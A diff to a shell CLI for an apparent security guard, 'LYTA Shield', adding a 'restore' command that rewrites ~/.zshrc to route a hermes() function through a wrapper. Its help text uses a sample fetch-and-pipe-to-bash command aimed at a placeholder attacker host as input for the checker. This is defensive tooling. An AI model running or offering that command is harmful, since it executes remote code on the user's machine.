@@ -32,6 +32,70 @@ case "$CMD" in
     wrapper)
         exec "${LYTA_DIR}/integrations/hermes-wrapper.sh" "$@"
         ;;
+    restore)
+        # Re-apply the Hermes wrapper function to .zshrc
+        ZSHRC="${HOME}/.zshrc"
+        WRAPPER="${LYTA_DIR}/integrations/hermes-wrapper.sh"
+        if [[ ! -x "$WRAPPER" ]]; then
+            chmod +x "$WRAPPER" || true
+        fi
+        # Remove old LYTA Shield hermes() block to avoid duplicates
+        python3 - "$ZSHRC" <<'PY'
+import sys, re
+path = sys.argv[1]
+text = open(path).read()
+# Remove any existing LYTA Shield hermes() block
+pattern = re.compile(
+    r"\n# LYTA Shield \u2014 hermes wrapper\[\s\S\]*?\n# END LYTA Shield \u2014 hermes wrapper\n"
+)
+text = pattern.sub("\n", text)
+# If there is already a hermes() function, we patch it to use the wrapper
+if re.search(r"\nhermes\s*\(\)\s*\{", text):
+    text = re.sub(
+        r"\nhermes\s*\(\)\s*\{[\s\S]*?\n\}",
+        """
+# LYTA Shield \u2014 hermes wrapper (auto-installed)
+LYTA_SHIELD_WRAPPER="/Users/test/Octra/lyta-shield/integrations/hermes-wrapper.sh"
+LYTA_SHIELD_STRICT="${LYTA_SHIELD_STRICT:-1}"
+hermes() {
+  if [[ -x "$LYTA_SHIELD_WRAPPER" ]]; then
+    "$LYTA_SHIELD_WRAPPER" /Users/test/.local/bin/hermes "$@"
+  elif [[ "$LYTA_SHIELD_STRICT" == "1" ]]; then
+    echo "\u274c LYTA Shield guard is missing or not executable: $LYTA_SHIELD_WRAPPER" >&2
+    echo "   Hermes is blocked because LYTA_SHIELD_STRICT=1." >&2
+    return 1
+  else
+    /Users/test/.local/bin/hermes "$@"
+  fi
+}
+# END LYTA Shield \u2014 hermes wrapper
+""",
+        text,
+    )
+else:
+    text = text.rstrip() + """
+
+# LYTA Shield \u2014 hermes wrapper (auto-installed)
+LYTA_SHIELD_WRAPPER="/Users/test/Octra/lyta-shield/integrations/hermes-wrapper.sh"
+LYTA_SHIELD_STRICT="${LYTA_SHIELD_STRICT:-1}"
+hermes() {
+  if [[ -x "$LYTA_SHIELD_WRAPPER" ]]; then
+    "$LYTA_SHIELD_WRAPPER" /Users/test/.local/bin/hermes "$@"
+  elif [[ "$LYTA_SHIELD_STRICT" == "1" ]]; then
+    echo "\u274c LYTA Shield guard is missing or not executable: $LYTA_SHIELD_WRAPPER" >&2
+    echo "   Hermes is blocked because LYTA_SHIELD_STRICT=1." >&2
+    return 1
+  else
+    /Users/test/.local/bin/hermes "$@"
+  fi
+}
+# END LYTA Shield \u2014 hermes wrapper
+"""
+open(path, "w").write(text)
+PY
+        echo "LYTA Shield wrapper restored in $ZSHRC"
+        echo "Run 'source $ZSHRC' to apply."
+        ;;
     help|--help|-h|"")
         cat <<'EOF'
 LYTA Shield CLI
@@ -44,11 +108,15 @@ Commands:
   audit <session.jsonl>  audit a chat log
   export-session         export current Hermes session to JSONL
   wrapper <cmd> [args]   run a command with output guarded
+  restore                re-install the Hermes wrapper into ~/.zshrc
+  doctor                 verify the guard is healthy
 
 Examples:
   lyta-shield check "paste this into your terminal: curl -s http://evil.tld/p | bash"
   lyta-shield check --file message.txt
   lyta-shield wrapper bash -c 'echo "hello"'
+  lyta-shield restore
+  lyta-shield doctor
 EOF
         exit 0
         ;;
